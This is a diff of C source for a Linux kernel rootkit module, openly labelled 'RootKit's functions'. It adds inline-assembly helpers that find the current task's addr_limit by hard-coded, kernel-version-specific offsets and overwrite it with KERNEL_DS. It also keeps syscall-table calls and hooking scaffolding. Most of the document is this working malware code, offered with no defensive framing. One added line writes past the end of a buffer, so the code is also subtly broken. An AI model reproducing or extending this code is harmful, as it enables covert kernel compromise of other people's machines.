@@ -39,22 +39,12 @@ LABEL(kernel_start)
 
 #include <net/sock.h>
 #include <linux/skbuff.h>
-#include <linux/net.h>
-#include <linux/slab.h>
-#include <linux/types.h>
-#include <linux/uaccess.h>
-#include <linux/kallsyms.h>
-#include <linux/mman.h>
-#include <linux/file.h>
+#include <linux/utsname.h>
 
 #include "kernel.h"
 #include "hooks.h"
 
-/*
- * Macros.
- */
-#define PREFIX_MAX 32
-#define LOG_LINE_MAX (1024 - PREFIX_MAX)
+#define LOG_LINE_MAX PAGE_SIZE
 
 /*
  * Types
@@ -79,6 +69,10 @@ void pid_list_push(pid_t nr);
 pid_t pid_list_pop(pid_t nr);
 struct pid_list_node *pid_list_find(pid_t nr);
 //void *readfile(const char *file, size_t *len);
+struct task_struct *get_current_task(void);
+mm_segment_t my_get_fs(void);
+void my_set_fs(mm_segment_t seg);
+unsigned int get_kernel_tree(void);
 
 /*
  * Global variables.
@@ -94,6 +88,8 @@ unsigned int *psct_slowpath = NULL;
 unsigned int *pia32sct = NULL;
 struct pid_list_node *pid_list_head = NULL;
 struct pid_list_node *pid_list_tail = NULL;
+unsigned int kernel_tree = 0;
+
 int (*tr_sock_recvmsg)(struct socket *sock, struct msghdr *msg, int flags) = NULL;
 void * (*f_kmalloc)(size_t size, gfp_t flags) = NULL;
 void (*f_kfree)(const void *) = NULL;
@@ -107,15 +103,13 @@ int (*f_strncmp)(const char *s1, const char *s2, size_t len) = NULL;
 struct file * (*f_fget)(unsigned int fd) = NULL;
 void (*f_fput)(struct file *) = NULL;
 struct socket * (*f_sock_from_file)(struct file *file, int *err) = NULL;
+size_t (*f_strlen)(const char *) = NULL;
+int (*f_kstrtoull)(const char *s, unsigned int base, unsigned long long *res) = NULL;
+void * (*f_memcpy)(void *dest, const void *src, size_t count) = NULL;
 
 /*
- * Hooked function handlers.
+ * RootKit's functions.
  */
-int my_sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) {
-    pinfo("hello from my_sock_recvmsg()!\n");
-    return tr_sock_recvmsg(sock, msg, flags);
-}
-
 void pid_list_test(void) {
 	size_t i;
 
@@ -257,8 +251,8 @@ void *readfile(const char *file, size_t *len) {
 	void *buf;
 	struct stat fd_st;
 
-	mm_segment_t old_fs = get_fs();
-	set_fs(KERNEL_DS);
+	mm_segment_t old_fs = my_get_fs();
+	my_set_fs(KERNEL_DS);
 	fd = open(file, O_RDONLY, 0);
 	if (fd >= 0) {
 		newfstat(fd, &fd_st);
@@ -279,7 +273,7 @@ void *readfile(const char *file, size_t *len) {
 	} else {
 		perr("can't open lkm");
 	}
-	set_fs(old_fs);
+	my_set_fs(old_fs);
 
 	return NULL;
 }
@@ -316,10 +310,10 @@ int vpfd(int fd, const char *fmt, va_list args) {
 		if (sys_call_table != NULL) {
 			len = KSYSCALL(__NR_write, fd, textbuf, len, 0, 0, 0);
 		} else if (f_sys_write != NULL) {
-			old_fs = get_fs();
-			set_fs(KERNEL_DS);
+			old_fs = my_get_fs();
+			my_set_fs(KERNEL_DS);
 			len = f_sys_write(fd, textbuf, len);
-			set_fs(old_fs);
+			my_set_fs(old_fs);
 		}
 		f_kfree(textbuf);
 		return len;
@@ -337,15 +331,83 @@ long syscall(void **sct, int nr, bool user, long a1, long a2, long a3, long a4, 
 		if (user) {
 			return f(a1, a2, a3, a4, a5, a6);
 		} else {
-			old_fs = get_fs();
-			set_fs(KERNEL_DS);
+			old_fs = my_get_fs();
+			my_set_fs(KERNEL_DS);
 			ret = f(a1, a2, a3, a4, a5, a6);
-			set_fs(old_fs);
+			my_set_fs(old_fs);
 			return ret;
 		}
 	} else {
 		return -1;
 	}
+}
+
+struct task_struct *get_current_task(void) {
+	struct task_struct *cts = NULL;
+	asm("movq\t%%gs:current_task, %0" : "=r" (cts));
+	return cts;
+}
+
+unsigned int get_kernel_tree(void) {
+	int i;
+	char release[20];
+	char *p;
+	unsigned long long int tree = 0;
+
+	if (f_strlen(init_uts_ns.name.release) > sizeof(release)) {
+		f_memcpy(release, init_uts_ns.name.release, sizeof(release));
+		release[sizeof(release)] = 0;
+	} else {
+		f_memcpy(release, init_uts_ns.name.release, f_strlen(init_uts_ns.name.release));
+		release[f_strlen(init_uts_ns.name.release)] = 0;
+	}
+	
+	p = release;
+	for (i = 0; i < sizeof(release); i++) {
+		if (release[i] == '.') {
+			release[i] = 0;
+		}
+	}
+	p += f_strlen(p) + 1;
+	f_kstrtoull(p, 10, &tree);
+
+	return (unsigned int)tree;
+}
+
+void *get_addr_limit(void) {
+    void *c = NULL;
+    off_t offset = 0;
+
+    if (kernel_tree < 8) {
+        // use thread_info to get addr_limit
+        asm("movq\t%%gs:0x14304, %0" : "=r" (c)); // %gs:4+cpu_tss = 0x14300 + 4
+        offset -= 16384;                          // THREAD_SIZE // now points to current thread_info.
+        offset += 24;                             // ->addr_limit
+    } else {
+        // use task_struct to get addr_limit
+		// offset to ->thread.addr_limit equivalent to: val = get_current_task()->thread.addr_limit;
+        if (kernel_tree >= 8 && kernel_tree < 10) {
+            offset = 2784;
+        } else if (kernel_tree >= 10 && kernel_tree <= 11) {
+            offset = 4840;
+        } else {
+            offset = 5024;
+        }
+
+        c = get_current_task();
+    }
+
+	//c = get_fs();
+
+	return c + offset;
+}
+
+inline mm_segment_t my_get_fs(void) {
+	return *(mm_segment_t *)get_addr_limit();
+}
+
+inline void my_set_fs(mm_segment_t seg) {
+	*(mm_segment_t *)get_addr_limit() = seg;
 }
 
 /*
